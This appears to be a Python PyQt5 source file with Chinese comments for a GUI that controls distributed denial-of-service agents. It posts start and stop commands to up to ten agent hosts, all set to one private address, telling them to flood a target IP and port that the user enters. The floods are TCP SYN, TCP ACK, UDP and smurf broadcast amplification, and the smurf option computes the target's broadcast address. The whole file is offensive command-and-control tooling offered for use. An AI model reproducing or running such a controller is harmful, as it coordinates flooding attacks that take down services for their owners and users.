from PyQt5 import QtWidgets, QtGui, QtCore

# 引用ui.py檔案中的物件 
from ui import Ui_MainWindow

import requests
import ipaddress


URL_1 = 'http://192.168.200.51:9999/'
URL_2 = 'http://192.168.200.51:9999/'
URL_3 = 'http://192.168.200.51:9999/'
URL_4 = 'http://192.168.200.51:9999/'
URL_5 = 'http://192.168.200.51:9999/'
URL_6 = 'http://192.168.200.51:9999/'
URL_7 = 'http://192.168.200.51:9999/'
URL_8 = 'http://192.168.200.51:9999/'
URL_9 = 'http://192.168.200.51:9999/'
URL_10 = 'http://192.168.200.51:9999/'


class MainWindow(QtWidgets.QMainWindow):

    def __init__(self):
        super().__init__() # in python3, super(Class, self).xxx = super().xxx
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)

    
        #下拉式選單物件、顯示的文字
        self.ui.comboBox.addItems(['1','2','3','4','5','6','7','8','9','10'])
        #控制端
        self.setup_control()
        
    def setup_control(self):
        self.ui.changelabel.setText('Attack Detail')
        
        #Attack按鈕的觸發事件buttonClicked
        self.ui.pushButton.clicked.connect(self.buttonClicked)
        
        #Stop按鈕的觸發事件button_2Clicked
        self.ui.pushButton_2.clicked.connect(self.button_2Clicked)
    
    #攻擊事件
    def buttonClicked(self):
    	
    	#下拉式選單對應的主機位址
    	host = self.ui.comboBox.currentText()
    	match host:
        	case '1':url = URL_1
        	case '2':url = URL_2
        	case '3':url = URL_3
        	case '4':url = URL_4
        	case '5':url = URL_5
        	case '6':url = URL_6
        	case '7':url = URL_7
        	case '8':url = URL_8
        	case '9':url = URL_9
        	case '10':url = URL_10
        
        # 攻擊目標的IP 
    	IP = self.ui.lineEdit.text()
    	
    	# 攻擊目標的Port	
    	port = self.ui.lineEdit_2.text()
    	
    	# 攻擊目標的Broadcast address	
    	BdstIP = ipaddress.ip_network( IP + "/24" , strict=False).broadcast_address
    	
    	# 根據下拉市式選單，填入post請求的data
    	if self.ui.radioButton.isChecked():
    		mode = 'S'
    		my_data = {'attack':'tcp_attack', 'IP':IP, 'port':port,'mode':mode}
    		data_detail = f"attack:tcp_attack,IP:{IP},port:{port},mode:{mode}"
    		
    	if self.ui.radioButton_2.isChecked():
    		my_data = {'attack':'udp_attack', 'IP':IP, 'port':port}
    		data_detail = f"attack:ucp_attack,IP:{IP},port:{port}"
    		
    	if self.ui.radioButton_3.isChecked():
    		mode = 'A'
    		my_data = {'attack':'tcp_attack', 'IP':IP, 'port':port,'mode':mode}
    		data_detail = f"attack:tcp_attack,IP:{IP},port:{port},mode:{mode}"
    		
    	if self.ui.radioButton_4.isChecked():
    		my_data = {'attack':'smurf_attack', 'IP':IP, 'port':port,'BdstIP':BdstIP}
    		data_detail = f"attack:smurf.attack,IP:{IP},port:{port},BdstIP:{BdstIP}"
    		attack = "smurf_attack"
    		
    	start_url = url + 'start'
    	
    	#post請求的主機位址+請求內容(my_data)
    	r = requests.post(start_url, data=my_data)
    	
    	#在界面上顯示攻擊的詳細資訊
    	self.ui.changelabel.setText(f"{url} \n{data_detail}")
    
    #停止主機攻擊事件	
    def button_2Clicked(self):
    	host = self.ui.comboBox.currentText()
    	match host:
        	case '1':url = URL_1
        	case '2':url = URL_2
        	case '3':url = URL_3
        	case '4':url = URL_4
        	case '5':url = URL_5
        	case '6':url = URL_6
        	case '7':url = URL_7
        	case '8':url = URL_8
        	case '9':url = URL_9
        	case '10':url = URL_10
        	
    	
    	stop_url = url + 'stop'
    	#對選定主機post stop請求
    	r = requests.get(stop_url)
    	#在界面上顯示停止攻擊
    	self.ui.changelabel.setText("Stop")
       

if __name__ == '__main__' :
    import sys
    app = QtWidgets.QApplication(sys.argv)
    window =MainWindow()
    window.show()
    sys.exit(app.exec_())
